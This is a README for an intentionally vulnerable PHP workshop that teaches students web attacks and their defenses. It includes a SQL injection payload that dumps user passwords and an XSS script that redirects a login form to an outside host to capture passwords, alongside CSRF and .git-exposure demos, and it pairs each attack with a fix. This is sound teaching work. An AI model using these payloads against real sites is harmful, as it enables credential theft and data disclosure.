> **DISCLAIMER: code in this demonstration are intentionally vulnerable. Do not use this code in your application!**

# Web Application Security Demo
Designed for students of [KIV/WEB](https://courseware.zcu.cz/portal/studium/courseware/kiv/web) of [University of West Bohemia](http://www.zcu.cz/en/)

> Older version of this workshop is available [here](https://github.com/intraworlds/zcu-security-demo)

## Presentation
[Slides](PRESENTATION.pdf)

## Development
### Requirements
- PHP >=7.1
- PHP extensions PDO and pdo_sqlite

### Installation
Clone this repository `git clone https://github.com/intraworlds/workshop-web-security.git` or download [ZIP file](https://github.com/intraworlds/workshop-web-security/archive/master.zip)

### Run
Inside downloaded project run
```bash
php -S 127.0.0.1:8080
```

Then goto http://127.0.0.1:8080/

### Simulate attacks

#### SQL injection
- go to http://127.0.0.1:8080/sql-injection
- search for `' UNION SELECT name,password FROM user --`
- observe disclosed password

##### Defense
Prepare statement
```php
// prepare SQL statement on DB without arguments
$statement = $pdo->prepare($sql);

// send arguments separately (safely)
$statement->execute(['%' . $query . '%']);

// execute as normal
$users = $statement->fetchAll();
```

#### XSS
- goto http://127.0.0.1:8080/xss
- put following comment
```html
❤️<script>
var form = document.querySelector('form');
form.setAttribute('action', 'https://httpbin.org/post');
form.setAttribute('target', '_blank');
</script>
```
- observe that all following backer are sending passwords to malicious server

##### Defense
escape your outputs
```php
echo htmlspecialchars($comment);
```

#### CSRF
- goto http://127.0.0.1:8080/csrf
- login
- open http://127.0.0.1:8080/kittens.php
- go back to http://127.0.0.1:8080/csrf
- observe that new order was created under your login

##### Defense
use `$_POST` for request which modifies data
```php
// verify CSRF token send with form is valid
if ($_SESSION['csrf'] !== $_POST['csrf']) {
    http_response_code(403);
    exit;
}

// generate CSRF token for the next request
$_SESSION['csrf'] = bin2hex(random_bytes(16));
```

#### Directory traversal
- todo http://127.0.0.1:8080/.git/HEAD
- observe that you have complete access to `.git` folder therefore to all files

##### Defense
- build application without `.git`
- separate public content (images, styles, etc.)
- adjust configuration of your web server, eg.
```
# denied all files
<RequireAll>
    Require all denied
</RequireAll>

# whitelist only *.php and other files
<Directory "public">
    <FilesMatch "((^$)|(^.+\.(css|map|js)$))">
        Require all granted
    </FilesMatch>
</Directory>
```


#### Weak hash algorithm
- obtain password hashes by SQL injection attack
- crack passwords by arbitrary online cracker (Rainbow table)

## Resources

- [Full list of attacks](https://www.owasp.org/index.php/Category:Attack)
- Twitter
  - Michal Špaček [@spazef0rze](https://twitter.com/spazef0rze)
  - Vladimír Smitka [@smitka](https://twitter.com/smitka)

### XSS (Cross-site Scripting)
 - [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
 - [OWASP XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
 - [OWASP testing for XSS](https://www.owasp.org/index.php/Testing_for_Cross_site_scripting)
 - [PHP triky: Cross Site Scripting](https://php.vrana.cz/cross-site-scripting.php) (czech only)

### HTTP Headers
 - ~~[X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection)~~
 - [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### SQL injection
 - [OWASP SQL injection](https://www.owasp.org/index.php/SQL_Injection)
 - [Soom: SQL Injection (Full Paper)](https://www.soom.cz/clanky/1180--SQL-Injection-Full-Paper#sekce5) (czech only)
 - [PHP triky: Obrana proti SQL Injection](https://php.vrana.cz/obrana-proti-sql-injection.php) (czech only)

### CSFR (Cross-Site Request Forgery)
 - [OWASP CSFR](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
 - [Soom](https://www.soom.cz/clanky/484--Cross-Site-Request-Forgery) (czech only)
 - [PHP triky: Cross-Site Request Forgery](https://php.vrana.cz/cross-site-request-forgery.php) (czech only)
 - [Co je Cross-Site Request Forgery a jak se mu bránit](https://www.zdrojak.cz/clanky/co-je-cross-site-request-forgery-a-jak-se-branit/) (czech only)

### Path (Directory) Traversal
 - [OWASP Path Traversal](https://www.owasp.org/index.php/Path_Traversal)

### Others
 - [Self tweeting tweet](https://twitter.com/derGeruhn/status/476764918763749376)
 - [XSS in Avast Desktop AntiVirus](https://medium.com/bugbountywriteup/5-000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop-1e99375f0968)
 - [JWT vulnerabilities](https://github.com/ticarpi/jwt_tool) (eg. _Key injection_)
